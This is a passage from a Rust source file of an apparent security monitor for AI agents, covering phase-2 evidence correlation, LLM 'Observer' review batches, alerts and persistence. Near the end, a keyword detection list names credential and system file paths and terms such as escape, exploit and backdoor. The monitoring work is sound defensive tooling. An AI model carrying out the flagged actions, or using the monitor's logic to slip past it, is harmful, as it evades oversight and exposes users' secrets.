                .write_blocking(PersistRecord::ContextPollution(
                    crate::responsibility::types::policy_types::ContextPollution {
                        source_agent: record.source_agent.clone(),
                        contaminated_artifact: path.clone(),
                        propagation_path: vec![],
                        detected_at_ns: record.timestamp_ns,
                    },
                ))
                .await;
        }

        // ── Cleanup ────────────────────────────────────────────────
        // Clear only processed items: nodes, edges, evidence (persisted),
        // and timeline (consumed). Keep intents and actions for Phase 2
        // batch correlation in finalize().
        self.graph_buffer.nodes.clear();
        self.graph_buffer.edges.clear();
        self.graph_buffer.evidence.clear();
        self.graph_buffer.timeline.clear();
        self.dirty = false;
    }

    // ── Phase 2: Batch Finalization ──────────────────────────────────

    /// Finalize the session with Phase 2 authoritative refinement.
    ///
    /// Per spec §3.2:
    /// 1. Get frozen signal snapshot
    /// 2. Run authoritative identity resolution
    /// 3. Run batch evidence correlation (all intents × all actions)
    /// 4. Finalize graph with identity + evidence refinements
    /// 5. Run authoritative classification (no observer)
    /// 6. Build authoritative claims/alerts/tracebacks
    /// 7. Persist all authoritative data + refinements
    ///
    /// # Safety
    ///
    /// This method holds `&mut self`, so it is mutually exclusive with
    /// `trigger()`. The `run()` loop ensures `finalize()` only executes
    /// after the last `trigger()` completes.
    pub async fn finalize(&mut self) {
        if let Some(health) = &self.terminal_health
            && let Ok(mut health) = health.lock()
        {
            health.stopped = true;
        }
        // ── 1. Frozen signal snapshot ──────────────────────────────
        self.signal_graph.evict_expired(current_time_ns());
        let snapshot = self.signal_graph.snapshot();

        // ── 2. Authoritative identity resolution ───────────────────
        let delegated_pairs: std::collections::HashSet<(ProcessId, ProcessId)> = self
            .graph_builder
            .delegation_records()
            .iter()
            .map(|record| {
                (
                    ProcessId::new(record.parent_pid, record.parent_start_time_ns),
                    ProcessId::new(record.child_pid, record.child_start_time_ns),
                )
            })
            .filter(|(parent, child)| parent != child)
            .collect();
        // Freeze the PRE-resolver input immediately, while only captured
        // signal facts and observed delegations exist. It must never be
        // reconstructed from `authoritative_identity`.
        let identity_input = crate::responsibility::identity::RawIdentityInput::from_snapshot(
            &snapshot,
            delegated_pairs.iter().copied(),
        );
        // Freeze the comm boundary in the same step. Live resolution and every
        // later replay consume this value, never the current environment.
        let identity_policy = crate::responsibility::identity::IdentityBoundaryPolicy::active();
        let authoritative_identity = self
            .identity_resolver
            .resolve_authoritative_with_delegations_and_policy(
                &snapshot,
                &delegated_pairs,
                &identity_policy,
            );
        // Physical identities plus the logical conversation identities that
        // are supported by observed anchored messages. A logical identity has
        // no process owner, so it never writes the shared PID mapping below.
        let resolved_identities = authoritative_identity.resolved_identities();

        // Persist authoritative identities and refinements.
        // Also persist authoritative process→agent mappings so that
        // identity_process_map uses deterministic hashes instead of
        // provisional UUIDs. Phase 2 is the source of truth.
        for agent in &resolved_identities {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::AuthoritativeIdentity(agent.clone()))
                .await;
            for pid in &agent.process_ids {
                let belief_level = match agent.confidence {
                    crate::responsibility::types::identity_types::AgentConfidence::Authoritative => {
                        IdentityBeliefLevel::Authoritative
                    }
                    crate::responsibility::types::identity_types::AgentConfidence::Inferred => {
                        IdentityBeliefLevel::Inferred
                    }
                };
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::IdentityMapping {
                        agent_id: agent.agent_id.clone(),
                        pid: pid.pid,
                        start_time_ns: pid.start_time_ns,
                        belief_level,
                        observed_at_ns: current_time_ns(),
                        source: "authoritative_identity_resolution",
                    })
                    .await;
            }
        }
        for refinement in &authoritative_identity.refinements {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::IdentityRefinement(refinement.clone()))
                .await;
        }
        for boundary in &authoritative_identity.subagent_boundaries {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::SubagentBoundary(boundary.clone()))
                .await;
        }

        // Freeze PRE-resolver provenance before the authoritative remap
        // consumes the phase-1 state. Provenance is intent-anchored, so it is
        // stored without any actor id.
        let frozen_intent_provenance: Vec<FrozenIntentProvenance> = {
            let mut entries: Vec<_> = self.graph_builder.intent_provenance().iter().collect();
            entries.sort_by(|left, right| left.0.as_str().cmp(right.0.as_str()));
            entries
                .into_iter()
                .map(|(intent_id, value)| FrozenIntentProvenance {
                    intent_id: intent_id.clone(),
                    tag: value.0.clone(),
                    span_id: value.1.clone(),
                    source: value.2.clone(),
                })
                .collect()
        };

        // Phase 2 identity must reach the graph, claims and alerts. Recording
        // refinements in a side table left every claim naming a phase-1 id
        // that does not exist in `agent_identities`.
        self.graph_builder
            .remap_agent_identities(&authoritative_identity);

        // ── 3. Batch evidence correlation ──────────────────────────
        // Collect all intents and actions from the buffer
        let all_intents: Vec<_> = std::mem::take(&mut self.graph_buffer.intents);
        let all_actions: Vec<_> = std::mem::take(&mut self.graph_buffer.actions);
        let batch_evidence =
            self.evidence_correlator
                .correlate_batch(&all_intents, &all_actions, &snapshot);

        // Persist batch evidence refinements; the retained evidence rows are
        // written once, after claims are built.
        for refinement in &batch_evidence.refinements {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::EvidenceRefinement(refinement.clone()))
                .await;
        }

        // ── 3.5 Feed batch evidence back into the graph ────────────
        //
        // Phase 2 correlation has no time window: it can link an intent and an
        // action that streaming correlation missed (evicted from the buffers,
        // or arriving in the wrong order). Persisting those links as `evidence`
        // rows was not enough — the rules, pattern matcher, claim builder and
        // traceback all read the graph, so a batch-only link produced zero
        // claims and could leave the run Safe. GraphBuilder::handle is
        // idempotent per (intent, action), so replaying phase-1 pairs here does
        // not duplicate edges.
        let identity_provider = AuthoritativeIdentityProvider::new(&authoritative_identity);
        let intents_by_id: HashMap<_, _> = all_intents
            .iter()
            .map(|intent| (intent.intent_id.clone(), intent))
            .collect();
        let actions_by_id: HashMap<_, _> = all_actions
            .iter()
            .map(|action| (action.action_id.clone(), action))
            .collect();
        let mut batch_only_links = 0usize;
        for evidence in &batch_evidence.evidence {
            let (Some(intent), Some(action)) = (
                intents_by_id.get(&evidence.intent_id),
                actions_by_id.get(&evidence.action_id),
            ) else {
                continue;
            };
            let delta = self
                .graph_builder
                .handle(evidence, intent, action, &identity_provider);
            if !delta.new_edges.is_empty() {
                batch_only_links += 1;
            }
        }
        if batch_only_links > 0 {
            eprintln!(
                "[phase2] batch correlation added {batch_only_links} graph link(s) phase 1 missed"
            );
        }

        // ── 4. Finalize graph ──────────────────────────────────────
        let graph = self.graph_builder.graph();
        let snapshot_nodes: Vec<_> = graph.all_nodes().cloned().collect();
        let snapshot_edges: Vec<_> = graph.all_edges().cloned().collect();
        let metrics = graph.metrics();
        // The snapshot is written once and is the only persisted graph:
        // `PersistenceReader::get_graph` reads it first. The identity remap has
        // already run, so the nodes here are the canonical phase-2 identities;
        // rewriting `graph_nodes` here would only duplicate those nodes.
        let graph_snapshot = GraphSnapshot {
            snapshot_id: uuid::Uuid::new_v4().to_string(),
            timestamp_ns: current_time_ns(),
            nodes: snapshot_nodes,
            edges: snapshot_edges,
            metrics,
        };
        let _ = self
            .persistence
            .write_blocking(PersistRecord::GraphSnapshot(graph_snapshot.clone()))
            .await;

        let _frozen =
            self.graph_builder
                .finalize(&authoritative_identity, &batch_evidence, graph_snapshot);

        // Persist graph refinements
        for refinement in &_frozen.refinements {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::GraphRefinement(refinement.clone()))
                .await;
        }

        // Freeze every decision input before either live analysis or replay.
        let timeline = BehaviorTimeline {
            steps: self.timeline.clone(),
            total_duration_ms: if let (Some(first), Some(last)) =
                (self.timeline.first(), self.timeline.last())
            {
                last.timestamp_ns.saturating_sub(first.timestamp_ns) / 1_000_000
            } else {
                0
            },
        };
        let persistence_flush_failed = self.persistence.flush().await.is_err();
        let mut capture_quality = crate::framework::runners::common::capture_health_snapshot();
        capture_quality["initial_process_snapshot"] = serde_json::json!({
            "schema":"mtagentlens.kernel-process-snapshot/v1",
            "dropped":self.initial_process_snapshot_dropped,
            "records":self.initial_process_snapshot.iter().map(|record| {
                serde_json::from_str::<serde_json::Value>(record).expect("snapshot serialized by this runtime")
            }).collect::<Vec<_>>(),
        });
        capture_quality["process_namespace_mappings"] = serde_json::json!({
            "schema": "mtagentlens.kernel-process-mappings/v2",
            "dropped": self.process_namespace_mapping_dropped,
            "records": self.process_namespace_mappings.iter().map(|record| {
                serde_json::from_str::<serde_json::Value>(record)
                    .expect("namespace witness was serialized by this runtime")
            }).collect::<Vec<_>>(),
        });
        capture_quality["recording_context"] = serde_json::json!({
            "schema": "mtagentlens.collector-context/v1",
            "start": self.recording_context_start,
            "finish": super::recording_context::capture(),
        });
        let provenance_strict = self.provenance.is_strict();
        capture_quality["analysis"] = serde_json::json!({
            // Classified raw Actions are pushed to the buffer before identity
            // gating, so a missing agent does not remove them from this
            // checkpoint or the identity cohort. This is not a claim that
            // every raw syscall was captured.
            "raw_actions_retained_before_identity": true,
            // Legacy counter name retained for consumers. Its meaning is
            // limited to "streaming correlation skipped", not "action lost".
            "actions_dropped_no_agent_semantics": "streaming_correlation_skipped",
            // Fragment flags are normal for streaming responses; only final
            // decode failures (malformed/transport_error) mean lost evidence.
            "decode_status": self.decode_status.clone(),
            "partial_tls_events": self.partial_tls_events,
            "initial_snapshot_dropped": self.initial_process_snapshot_dropped,
            "persist_dropped": self.persistence.lost_persist_count(),
            "persist_closed": self.persistence.channel_closed_count(),
            "persist_failures": self.persistence.write_failure_count(),
            "persist_flush_failed": persistence_flush_failed,
            // Raw JSONL writes that failed after the file opened. The audit
            // trail is incomplete, so quality must degrade.
            "raw_log_failures": crate::framework::analyzers::file_logger::file_log_failure_count(),
            // Coverage half of capture quality: what each runner actually
            // delivered, so zero loss cannot hide zero observation.
            "event_counts": self.source_counts,
            // Actual policy selected by the live tracker, not an environment
            // guess. Derived text matches never carry an authenticated
            // permission root.
            "provenance_policy": if provenance_strict {
                "strict_retrieved"
            } else {
                "user_named_allowed"
            },
            "authorization_unknown": true,
        });
        let mut checkpoint = crate::responsibility::replay::checkpoint::AnalysisCheckpoint {
            run_id: self.current_run_id.clone().unwrap_or_default(),
            contract: crate::responsibility::replay::checkpoint::REPLAY_CONTRACT.into(),
            implementation: crate::responsibility::replay::checkpoint::implementation_fingerprint(),
            graph: _frozen.snapshot.clone(),
            identity_input: Some(identity_input),
            identity_policy: Some(identity_policy),
            identities: resolved_identities,
            evidence: batch_evidence.evidence.clone(),
            intents: all_intents.clone(),
            actions: all_actions.clone(),
            delegations: self.graph_builder.delegation_records().to_vec(),
            score_signals: crate::responsibility::classification::scoring::ScoreSignals {
                baseline_deviation: self.last_baseline_deviation,
                cusum_triggered: self.last_cusum_triggered,
                cusum_dimensions: self.last_cusum_dimensions.clone(),
                progressive_fused: self.last_progressive_fused,
                observer_trigger_reason: String::new(),
            },
            observations: self.phase1_observations.clone(),
            disable_patterns: self.config.disable_patterns,
            classification_config: self.classification_engine.config().clone(),
            workspace_prefix: self.classification_engine.workspace_prefix().to_owned(),
            fallback_agent_id: authoritative_identity
                .agents
                .first()
                .map(|agent| agent.agent_id.clone())
                // No authoritative identity: keep the phase-1 gate (a
                // candidate existed) but never persist its provisional id as
                // the final subject. The sentinel is the explicit
                // "evidence without a resolved subject" value.
                .or_else(|| {
                    self.identity_resolver
                        .provisional_identities()
                        .first()
                        .map(|_| AgentId::from(crate::responsibility::graph::UNATTRIBUTED_AGENT_ID))
                }),
            timeline: timeline.clone(),
            capture_quality,
            observer_enabled: Some(!self.config.disable_observer),
            graph_refinements: _frozen.refinements.clone(),
            identity_refinements: authoritative_identity.refinements.clone(),
            evidence_refinements: batch_evidence.refinements.clone(),
            non_link_count: batch_evidence.non_links.len(),
            captured_request_contexts: Some(self.captured_request_contexts.clone()),
            graph_inputs: Some({
                let intent_ids: HashSet<&str> = all_intents
                    .iter()
                    .map(|intent| intent.intent_id.as_str())
                    .collect();
                let mut task_envelopes: Vec<_> = self
                    .task_envelopes
                    .iter()
                    .filter(|(intent_id, _)| intent_ids.contains(intent_id.as_str()))
                    .collect();
                task_envelopes.sort_by(|left, right| left.0.as_str().cmp(right.0.as_str()));
                FrozenGraphInputs {
                    version: FROZEN_GRAPH_INPUTS_VERSION,
                    task_envelopes: task_envelopes
                        .into_iter()
                        .map(|(intent_id, envelope)| FrozenTaskEnvelope {
                            intent_id: intent_id.clone(),
                            envelope: envelope.clone(),
                        })
                        .collect(),
                    provenance: frozen_intent_provenance
                        .iter()
                        .filter(|provenance| intent_ids.contains(provenance.intent_id.as_str()))
                        .cloned()
                        .collect(),
                }
            }),
        };
        // ── 4b. Review candidates the phase-2 graph introduced ──────
        //
        // Phase 2 batch correlation can link intent/action pairs the streaming
        // Observer never saw. They are reviewed once, as a batch, before the
        // authoritative verdict is frozen; a failed review stays fail-closed
        // (`ObserverFailed`), never an assumed vote. With the Observer disabled
        // the deterministic route decides and no presentation is fabricated.
        let (review_graph, review_patterns, pending_candidates) = checkpoint.review_request();
        if !pending_candidates.is_empty() && !self.config.disable_observer {
            let observed_task = ObservedTaskContext::from_intents(&checkpoint.intents);
            let descriptions: Vec<String> = checkpoint
                .intents
                .iter()
                .filter(|intent| !intent.tool_name.eq_ignore_ascii_case("UserPrompt"))
                .filter_map(|intent| {
                    intent
                        .tool_args
                        .iter()
                        .find_map(|arg| match arg {
                            crate::responsibility::types::NormalizedArg::Content(content)
                                if !content.is_empty() =>
                            {
                                Some(format!("{}: {}", intent.tool_name, content))
                            }
                            _ => None,
                        })
                        .or_else(|| Some(intent.tool_name.to_string()))
                })
                .take(10)
                .collect();
            eprintln!(
                "[phase2] reviewing {} candidate(s) that phase 1 never presented",
                pending_candidates.len()
            );
            // The Observer sees at most MAX_REVIEW_CANDIDATES per call. A single
            // call used to leave the overflow pending forever, which turned a
            // benign multi-agent run into Uncertain (31 unreviewed candidates).
            // Review every batch; a failed batch stays fail-closed.
            // A pathological run can produce thousands of unreviewed
            // candidates; reviewing every batch serially blocks phase-2
            // finalization for hours and burns paid model calls. The cap is
            // fail-closed (skipped batches stay unreviewed -> Uncertain).
            let batch_cap = observer_batch_cap();
            for (batch, chunk) in pending_candidates
                .chunks(crate::responsibility::classification::candidates::MAX_REVIEW_CANDIDATES)
                .enumerate()
            {
                if batch_cap_reached(batch, batch_cap) {
                    eprintln!(
                        "[phase2] observer batch cap {batch_cap:?} reached; {} batch(es) left unreviewed",
                        pending_candidates
                            .chunks(crate::responsibility::classification::candidates::MAX_REVIEW_CANDIDATES)
                            .count()
                            .saturating_sub(batch)
                    );
                    break;
                }
                match self
                    .classification_engine
                    .review_candidates_with_observer_and_task(
                        &review_graph,
                        &review_patterns,
                        &checkpoint.evidence,
                        chunk,
                        &descriptions,
                        Some(&observed_task),
                        self.observer.as_ref(),
                    )
                    .await
                {
                    Ok(output) => {
                        self.observer_calls += 1;
                        checkpoint.observations.extend(
                            crate::responsibility::classification::candidates::review_observations_with_output(
                                chunk,
                                &output,
                            ),
                        );
                    }
                    Err(error) => {
                        self.observer_failures += 1;
                        checkpoint.observations.push(
                            crate::responsibility::classification::final_decision::Observation::ObserverFailed {
                                reason: format!(
                                    "phase-2 candidate review batch {batch} failed: {error:?}"
                                ),
                            },
                        );
                        break;
                    }
                }
            }
        }
        if let Some(run_id) = self.current_run_id.clone() {
            let payload_json =
                serde_json::to_string(&checkpoint).expect("analysis checkpoint is serializable");
            self.persistence
                .write_blocking(PersistRecord::AnalysisCheckpointJson {
                    run_id,
                    kind: crate::responsibility::replay::checkpoint::CHECKPOINT_KIND.into(),
                    version: crate::responsibility::replay::checkpoint::CHECKPOINT_VERSION,
                    payload_json,
                })
                .await;
        }
        let analysis = checkpoint.evaluate();
        if let Some(run_id) = self.current_run_id.clone() {
            self.persistence
                .write_blocking(PersistRecord::AnalysisCheckpoint {
                    run_id,
                    kind: crate::responsibility::replay::run_metrics::RUN_METRICS_KIND.into(),
                    version: crate::responsibility::replay::run_metrics::RUN_METRICS_VERSION,
                    payload: serde_json::to_value(&analysis.run_metrics)
                        .expect("run metrics are serializable"),
                })
                .await;
        }
        if let Some(run_id) = self.current_run_id.clone() {
            self.persistence
                .write_blocking(PersistRecord::AnalysisCheckpoint {
                    run_id,
                    kind: crate::responsibility::claims::attribution::ATTRIBUTION_RESULTS_KIND
                        .into(),
                    version:
                        crate::responsibility::claims::attribution::ATTRIBUTION_RESULTS_VERSION,
                    payload: serde_json::to_value(&analysis.attributions)
                        .expect("attribution results are serializable"),
                })
                .await;
        }
        let classification_result = analysis.classification;
        let phase2_route = analysis.route;
        let final_verdict = analysis.verdict;
        let claims = analysis.claims;
        let tracebacks = analysis.tracebacks;
        self.claim_diagnostics.observe(&analysis.diagnostics);
        let graph = &analysis.graph;

        let fallback_agent = checkpoint.fallback_agent_id.clone();

        let has_graph_agent = graph.all_nodes().any(|n| {
            n.node_type == NewNodeType::Agent
                && n.agent_id.as_ref().map(|a| a.as_str())
                    != Some(crate::responsibility::graph::UNATTRIBUTED_AGENT_ID)
        });
        let can_identify_agent = fallback_agent.is_some() || has_graph_agent || !claims.is_empty();
        // Snapshot phase-1 counts BEFORE the refinement drain: the old summary
        // read `phase1_alert_ids.len()` after `drain(..)` and always reported 0.
        let phase1_alert_count = self.phase1_alert_ids.len() as u64;
        let phase1_claim_count = self.phase1_claim_ids.len() as u64;
        let mut final_alert_id: Option<String> = None;

        if can_identify_agent {
            let final_timestamp = current_time_ns();
            let mut alert = AlertBuilder::compose_with_context(
                &claims,
                &classification_result,
                None, // Phase 2 never calls the observer; it aggregates phase-1 verdicts
                graph,
                &timeline,
                fallback_agent.as_ref(),
                crate::responsibility::claims::alert_builder::ComposeContext {
                    timestamp_ns: final_timestamp,
                    phase: crate::responsibility::types::PhaseIndicator::Authoritative {
                        timestamp_ns: final_timestamp,
                        overrides: None,
                    },
                    final_verdict: Some(&final_verdict),
                },
            );
            // Link the final alert to the last provisional alert it supersedes.
            alert.provisional_ref = self.phase1_alert_ids.last().cloned();
            if let ClassRoute::DirectSafe(output) | ClassRoute::DirectUnsafe(output) = &phase2_route
                && !output.rule_verdicts.is_empty()
            {
                alert.engine.rule_verdicts = output.rule_verdicts.clone();
            }

            // Persist claims FIRST (traceback has FOREIGN KEY to claim)
            for claim in &claims {
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::Claim(claim.clone()))
                    .await;
            }

            // Build and persist tracebacks AFTER claims
            for traceback in &tracebacks {
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::Traceback(traceback.clone()))
                    .await;
            }
            let _ = self
                .persistence
                .write_blocking(PersistRecord::Alert(compact_alert_for_storage(&alert)))
                .await;

            final_alert_id = Some(alert.alert_id.to_string());

            // Broadcast final authoritative alert
            let phase2_alert_id = alert.alert_id.clone();
            broadcast_alert_with_emission(&self.alert_tx, alert);

            // ── Persist Phase1→Phase2 refinements ──────────────────────
            for p1_id in self.phase1_alert_ids.drain(..) {
                let _ = self.persistence.write_blocking(PersistRecord::ClassificationRefinement(
                    crate::responsibility::types::refinement::ClassificationRefinement {
                        phase1_alert_id: p1_id,
                        phase2_alert_id: phase2_alert_id.clone(),
                        // The provisional alert is superseded, not dismissed:
                        // its evidence still counts toward the final verdict.
                        refinement_type: crate::responsibility::types::refinement::ClassificationRefinementType::Changed,
                        reason: "Superseded by the run's aggregated final verdict".into(),
                        score_delta: 0.0,
                    })).await;
            }
            // Map each provisional claim to the rebuilt claim with the same
            // logical key. A refinement that names a placeholder cannot join
            // any persisted claim, so the phase-1/phase-2 mapping was lost.
            let phase2_by_key: std::collections::HashMap<_, ClaimId> = claims
                .iter()
                .map(|claim| (claim_logical_key(claim), claim.claim_id.clone()))
                .collect();
            let phase1_ids: Vec<ClaimId> = self.phase1_claim_ids.drain().collect();
            for c1_id in phase1_ids {
                let key = self.phase1_claims.get(&c1_id).map(claim_logical_key);
                let (phase2_claim_id, refinement_type, reason) =
                    match key.and_then(|key| phase2_by_key.get(&key).cloned()) {
                        Some(id) => (
                            id,
                            crate::responsibility::types::refinement::ClaimRefinementType::Confirmed,
                            "Rebuilt in phase 2 from the frozen graph with the same logical key"
                                .to_string(),
                        ),
                        None => (
                            c1_id.clone(),
                            crate::responsibility::types::refinement::ClaimRefinementType::Dismissed,
                            "No phase-2 claim shares this logical key; the refinement points at the provisional claim"
                                .to_string(),
                        ),
                    };
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::ClaimRefinement(
                        crate::responsibility::types::refinement::ClaimRefinement {
                            phase1_claim_id: c1_id,
                            phase2_claim_id,
                            refinement_type,
                            reason,
                        },
                    ))
                    .await;
            }
        } // can_identify_agent

        // Persist only the bounded, claim-covered evidence set. Live graph and
        // claim construction used the full in-memory evidence vector above.
        let selected = crate::responsibility::evidence::retention::select_for_persistence(
            &self.review_evidence,
            &all_actions,
            &claims,
        );
        for ev in selected {
            if self.persisted_intent_ids.contains(&ev.intent_id)
                && self.persisted_action_ids.contains(&ev.action_id)
            {
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::Evidence(ev))
                    .await;
            }
        }

        // The run's canonical verdict is recorded even when no alert could be
        // attributed to an agent: "evidence exists but no subject" is a
        // different state from "nothing observed", and downstream metrics
        // must be able to tell them apart.
        if let Some(run_id) = self.current_run_id.clone() {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::RunFinalVerdict {
                    run_id,
                    alert_id: final_alert_id,
                    verdict: final_verdict.clone(),
                })
                .await;
        }

        // ── Build and emit structured evaluation summary ──────────
        let summary = EvaluationSummary {
            session_id: uuid::Uuid::new_v4().to_string(),
            run_duration_ms: elapsed_millis(self.run_started_ns, current_time_ns()),
            total_events: self.event_count as u64,
            total_intents: all_intents.len() as u64,
            total_actions: all_actions.len() as u64,
            pbc_edge_count: graph
                .edges_of_type(&NewEdgeType::PolicyBoundaryCrossing)
                .len() as u64,
            claim_count: phase1_claim_count + claims.len() as u64,
            alert_count: phase1_alert_count + u64::from(can_identify_agent),
            observer_calls: self.observer_calls as u64,
            classification_route: classification_result.route.clone(),
            final_score: classification_result.score,
            per_agent_scores: self
                .progressive_scorer
                .agents
                .iter()
                .map(
                    |(aid, state)| crate::responsibility::output::AgentScoreSummary {
                        agent_id: aid.to_string(),
                        fused_score: self
                            .progressive_scorer
                            .get_agent_fused_score(aid)
                            .unwrap_or(0.0),
                        dimension_scores: [
                            state.dims[0].ewma,
                            state.dims[1].ewma,
                            state.dims[2].ewma,
                            state.dims[3].ewma,
                            state.dims[4].ewma,
                            state.dims[5].ewma,
                        ],
                        cusum_triggered: state.dims.iter().any(|d| {
                            d.cusum > self.progressive_scorer.config.cusum_h
                                && d.consecutive >= self.progressive_scorer.config.consecutive_k
                        }),
                        evidence_conflict: state.dims[DimIndex::D1Boundary as usize].ewma > 0.5
                            && state.dims[DimIndex::D5CrossContext as usize].ewma < 0.2,
                        baseline_established: self
                            .baseline_tracker
                            .get(aid.as_str())
                            .map(|b| b.is_established())
                            .unwrap_or(false),
                    },
                )
                .collect(),
            alerts: vec![],
        };
        let writer = OutputWriter::new(OutputFormat::Text);
        eprintln!("{}", writer.format_summary(&summary));

        // Also emit as JSON for structured consumers
        let json_writer = OutputWriter::new(OutputFormat::Json);
        eprintln!("[evaluation:json] {}", json_writer.format_summary(&summary));

        // Routing diagnostics. These are the counters that explain "the run
        // observed traffic but produced no intents/actions": an empty result
        // must be distinguishable from an unobserved one.
        eprintln!(
            "[diagnostics:json] {}",
            serde_json::json!({
                "evidence_attempted": DIAG_EVIDENCE_ATTEMPTED.load(std::sync::atomic::Ordering::Relaxed),
                "evidence_intents": DIAG_EVIDENCE_INTENTS.load(std::sync::atomic::Ordering::Relaxed),
                "intents_deduped": DIAG_INTENTS_DEDUPED.load(std::sync::atomic::Ordering::Relaxed),
                "openclaw_tool_calls": DIAG_OPENCLAW_TOOL_CALLS.load(std::sync::atomic::Ordering::Relaxed),
                "delegation_parent_unresolved": DIAG_DELEGATION_PARENT_UNRESOLVED
                    .load(std::sync::atomic::Ordering::Relaxed),
                "actions_produced": DIAG_ACTIONS_PRODUCED.load(std::sync::atomic::Ordering::Relaxed),
                "actions_dropped_no_agent": DIAG_ACTIONS_DROPPED_NO_AGENT.load(std::sync::atomic::Ordering::Relaxed),
                "actions_dropped_bpf_noise": DIAG_ACTIONS_DROPPED_BPF_NOISE.load(std::sync::atomic::Ordering::Relaxed),
                "bodies_too_large": crate::responsibility::evidence::intent_extractor::DIAG_BODY_TOO_LARGE
                    .load(std::sync::atomic::Ordering::Relaxed),
                "taint_edges": self.claim_diagnostics.taint_edges,
                "taint_authorized": self.claim_diagnostics.taint_authorized,
                "taint_unauthorized": self.claim_diagnostics.taint_unauthorized,
                "observer_failures": self.observer_failures,
                "provenance_spans": self.provenance.span_count(),
                "provenance_matched_intents": self.provenance.matched_intent_count(),
                "provenance_strict": self.provenance.is_strict(),
                "taint_unattributed": self.claim_diagnostics.taint_unattributed,
                "taint_claims_emitted": self.claim_diagnostics.taint_claims_emitted,
                "taint_claims_below_confidence": self.claim_diagnostics.taint_claims_below_confidence,
                "latency": self.latency.summary(),
                "decode_status": self.decode_status,
                "partial_tls_events": self.partial_tls_events,
            })
        );

        // Flush all pending persistence writes
        let _ = self.persistence.flush().await;
    }

    /// Finalize the run and make the persistence outcome visible.
    ///
    /// Both shutdown branches of the live event loop need this. Duplicating it
    /// is how the two copies drifted: the flush result was discarded with
    /// `let _ =`, and the drop / write-failure counters were never printed, so a
    /// run could lose persisted rows while looking perfectly healthy.
    async fn finalize_session(&mut self, run_id: &str) {
        if self.dirty {
            self.trigger().await;
        }
        self.finalize().await;

        // RunEnd must not be a best-effort `try_send`: phase 2 queues claims,
        // tracebacks, the alert and the final verdict immediately before it,
        // and a full channel silently dropped the marker. Every corpus
        // database ended with `ended_at_ns = NULL`, which makes run duration
        // and "did the run finalize?" unanswerable.
        let _ = self
            .persistence
            .write_blocking(PersistRecord::RunEnd {
                run_id: run_id.to_string(),
                timestamp_ns: current_time_ns(),
            })
            .await;

        if let Err(e) = self.persistence.flush().await {
            eprintln!("persistence: final flush failed: {e}");
        }
        let lost = self.persistence.lost_persist_count();
        let failed = self.persistence.write_failure_count();
        let closed = self.persistence.channel_closed_count();
        if lost > 0 || failed > 0 || closed > 0 {
            eprintln!(
                "persistence: DEGRADED — {lost} record(s) dropped before the writer, \
                 {failed} write-path failure(s), {closed} record(s) rejected after the \
                 writer task exited; persisted run data is incomplete"
            );
        } else {
            eprintln!(
                "persistence: flushed cleanly (0 dropped, 0 write failures, 0 closed-channel)"
            );
        }
    }
}

// ─── Helpers ─────────────────────────────────────────────────────────

/// Whether a tool intent contains a keyword that justifies forcing the
/// Observer even outside the grey zone.
///
/// `UserPrompt` is excluded: benchmark prompts embed the scenario catalogue
/// (e.g. "credential-theft-direct"), which made every run look suspicious and
/// forced an Observer call in 12/12 scenarios. The prompt is content the model
/// reads, not an action the agent takes.
fn intent_is_suspicious(intent: &crate::responsibility::types::Intent) -> bool {
    if intent.tool_name.eq_ignore_ascii_case("UserPrompt") {
        return false;
    }
    let text = format!("{} {:?}", intent.tool_name, intent.tool_args);
    [
        "docker",
        "sudo",
        "/etc/shadow",
        "/etc/passwd",
        "/proc/",
        ".ssh/",
        "credential",
        "escape",
        "inject",
        "exploit",
        "backdoor",
        "typosquat",
        "pyjwt",
        "cryptograph",
        "pip install",
    ]
    .iter()
    .any(|keyword| text.contains(keyword))
}

/// Phase-1 alert emission gate.
///
/// An alert needs either an identifiable agent plus at least one new claim,
/// or an Observer verdict of Unsafe with cited evidence (which can stand
/// without a PBC claim). Kept as a pure function so the gate itself is
/// testable without spinning up an event stream.
/// Number of times the most-repeated boundary was observed.
///
/// A boundary edge accumulates one `evidence_ref` per confirmed observation.
/// The maximum across edges is the only repetition signal the graph currently
/// supports; graph size is not repetition.
fn pbc_repetition_count(graph: &crate::responsibility::graph::ResponsibilityGraph) -> u32 {
    graph
        .edges_of_type(&NewEdgeType::PolicyBoundaryCrossing)
        .iter()
        .filter_map(|edge_id| graph.get_edge(edge_id))
        .map(|edge| edge.evidence_refs.len() as u32)
        .max()
        .unwrap_or(0)
}

fn alert_gate_allows(
    can_identify_agent: bool,
    new_claim_count: usize,
    observer_detected: bool,
) -> bool {
    (can_identify_agent && new_claim_count > 0) || observer_detected
}

// ─── Time Helper ─────────────────────────────────────────────────────

/// Session duration for the console summary. An unknown start stays zero
/// instead of inventing a duration; a reversed clock saturates.
fn elapsed_millis(start_ns: Option<u64>, end_ns: u64) -> u64 {
    start_ns
        .map(|start| end_ns.saturating_sub(start) / 1_000_000)
        .unwrap_or(0)
}

/// Current time in nanoseconds since UNIX epoch.
fn current_time_ns() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
}

// ─── Analyzer Trait Integration ────────────────────────────────────────

/// Implements the framework `Analyzer` trait so ResponsibilityRuntime can
/// be plugged into the AgentRunner global analyzer chain.
///
/// The `process()` method:
/// 1. Initializes the session (collector context + RunStart marker)
/// 2. Drains the input `EventStream`, routing each event through Phase 1
/// 3. Triggers debounced classification (every N events or on tick)
/// 4. Runs Phase 2 authoritative batch refinement when the stream ends
/// 5. Writes RunEnd + flushes persistence before returning
#[async_trait::async_trait]
impl Analyzer for ResponsibilityRuntime {
    fn name(&self) -> &str {
        "responsibility_runtime"
    }

    async fn process(&mut self, input: EventStream) -> Result<EventStream, AnalyzerError> {
        let run_id = self.init_session();
        let mut input = Box::pin(input);
        let mut tick =
            tokio::time::interval(std::time::Duration::from_millis(self.config.debounce_ms));
        tick.tick().await; // suppress immediate first tick

        // Poll interval for shutdown check (every 500ms)
        let mut shutdown_poll = tokio::time::interval(std::time::Duration::from_millis(500));

        loop {
            tokio::select! {
                event_opt = input.next() => {
                    match event_opt {
                        Some(event) => {
